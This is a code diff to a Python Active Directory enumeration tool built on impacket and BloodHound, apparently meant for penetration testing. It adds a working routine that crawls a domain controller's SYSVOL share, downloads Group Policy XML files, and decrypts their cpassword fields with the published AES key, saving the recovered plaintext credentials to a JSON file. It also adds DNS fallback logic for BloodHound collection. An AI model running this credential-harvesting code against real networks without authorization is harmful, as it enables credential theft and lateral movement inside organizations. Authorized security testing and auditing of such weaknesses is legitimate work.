@@ -9,6 +9,8 @@ from termcolor import colored
 from impacket import smbconnection
 from impacket.dcerpc.v5 import srvs
 import contextlib, argparse, textwrap, errno, sys, socket, json, re, os, base64
+from Crypto.Cipher import AES
+from dns.resolver import NXDOMAIN
 
 # Thanks SecureAuthCorp for GetNPUsers.py
 # For Kerberos preauthentication
@@ -82,6 +84,7 @@ class EnumAD():
        
         self.checkForPW()
         self.checkOS()
+        self.checkSYSVOL()
 
         if self.bhout:
             self.outputToBloodhoundJson()
@@ -278,6 +281,74 @@ class EnumAD():
                 break
 
         print('[ ' + colored('OK', 'green') +' ] Wrote hosts with oldest OS to {0}-oldest-OS'.format(self.server))
+    
+
+    def checkSYSVOL(self):
+        print('[ .. ] Searching SYSVOL for cpasswords\r')
+        cpasswords = {}
+        try:
+            smbconn = smbconnection.SMBConnection('\\\\{0}\\'.format(self.server), self.server, timeout=5)
+            smbconn.login(self.domuser, self.passwd)
+            dirs = smbconn.listShares()
+            for share in dirs:
+                if str(share['shi1_netname']).rstrip('\0').lower() == 'sysvol':
+                    path = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), '*')
+                    paths = [e.get_shortname() for e in path if len(e.get_shortname()) > 2]
+                    for dirname in paths:
+                        try:
+                            # Dont want . or ..
+                            subPath = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), str(dirname) + '\\*')
+                            for sub in subPath:
+                                if len(sub.get_shortname()) > 2:
+                                    paths.append(dirname + '\\' + sub.get_shortname())
+                        except (SessionError, UnicodeEncodeError, NetBIOSError) as e:
+                            continue
+                
+                    # Compile regexes for username and passwords
+                    cpassRE = re.compile(r'cpassword=\"([a-zA-Z0-9/]+)\"')
+                    unameRE = re.compile(r'userName|runAs=\"([ a-zA-Z0-9/\(\)-]+)\"')
+
+                    # Prepare the ciphers based on MSDN article with key and IV
+                    cipher = AES.new(bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'), AES.MODE_CBC, '\x00' * 16)
+                
+                    # Since the first entry is the DC we dont want that
+                    for item in paths[1:]:
+                        if '.xml' in item.split('\\')[-1]:
+                            print('item .xml: ' + str(item))
+                            with open('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]), 'wb') as f:
+                                smbconn.getFile(str(share['shi1_netname']).rstrip('\0'), item, f.write)             
+                            with open('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]), 'r') as f:
+                                try:
+                                    fileContent = f.read()
+                                    passwdMatch = cpassRE.findall(str(fileContent))
+                                    for passwd in passwdMatch:
+                                        unameMatch = unameRE.findall(str(fileContent))
+                                        for usr in unameMatch:
+                                            padding = '=' * (4 - len(passwd) % 4) 
+                                            # For some reason, trailing nul bytes were on each character, so we remove any if they are there
+                                            cpasswords[usr] = cipher.decrypt(base64.b64decode(bytes(passwd + padding, 'utf-8'))).strip().decode('utf-8').replace('\x00', '')
+                                except (UnicodeDecodeError, AttributeError) as e:
+                                    # Remove the files we had to write during the search
+                                    os.unlink('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]))
+                                    continue
+
+                            # Remove the files we had to write during the search
+                            os.unlink('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]))
+
+            if len(cpasswords.keys()) > 0:
+                with open('{0}-cpasswords.json'.format(self.server), 'w') as f:
+                    json.dump(cpasswords, f)
+
+            if len(cpasswords.keys()) == 1:
+                print('\033[1A\r[ ' + colored('OK', 'green') +' ] Found {0} cpassword in a GPO on SYSVOL share'.format(len(cpasswords.keys())))
+            else:
+                print('\033[1A\r[ ' + colored('OK', 'green') +' ] Found {0} cpasswords in GPOs on SYSVOL share'.format(len(cpasswords.keys())))
+
+
+        except (SessionError, UnicodeEncodeError, NetBIOSError) as e:
+            print('[ ' + colored('NOT OK', 'red') +' ] Some error occoured while searching SYSVOL'.format(self.server))
+        else:
+            smbconn.close()
 
 
     def splitJsonArr(self, arr):
@@ -293,14 +364,29 @@ class EnumAD():
             with self.suppressOutput():
                 opts = argparse.Namespace(dns_tcp=False, global_catalog=self.server)
                 auth = ADAuthentication(username=self.domuser, password=self.passwd, domain=self.server)
+            try:
                 ad = AD(auth=auth, domain=self.server, nameserver=None, dns_tcp=False)
                 ad.dns_resolve(kerberos=False, domain=self.server, options=opts)
+            except (NXDOMAIN) as e:
+                # So we didnt succeed with DNS lookup. Most likely an internal, so lets try to point to the DC
+                print('[ ' + colored('NOT OK', 'yellow') +' ] DNS lookup of Domain Controller failed - attempting to set the DC as Nameserver')
+                try:
+                    ns = socket.gethostbyname(self.server)
+                    opts = argparse.Namespace(dns_tcp=False, global_catalog=self.server, nameserver=ns)
+                    ad = AD(auth=auth, domain=self.server, nameserver=ns, dns_tcp=False)
+                    ad.dns_resolve(kerberos=False, domain=self.server, options=opts)
+                except (NXDOMAIN) as e:
+                    # I'm all out of luck
+                    print('[ ' + colored('NOT OK', 'red') +' ] DNS lookup of Domain Controller failed with DC as nameserver')
+                    exit(1)
+            with self.suppressOutput():
                 bloodhound = BloodHound(ad)
                 bloodhound.connect()
                 collection = resolve_collection_methods('Session,Trusts,ACL,DCOM,RDP,PSRemote')
                 bloodhound.run(collect=collection, num_workers=40, disable_pooling=False)
-                print('[ ' + colored('OK', 'green') +' ] BloodHound output generated')
+            print('[ ' + colored('OK', 'green') +' ] BloodHound output generated')
         except Exception as e:
+            print(e)
             print('[ ' + colored('NOT OK', 'red') +' ] Generating BloodHound output failed')
 
 
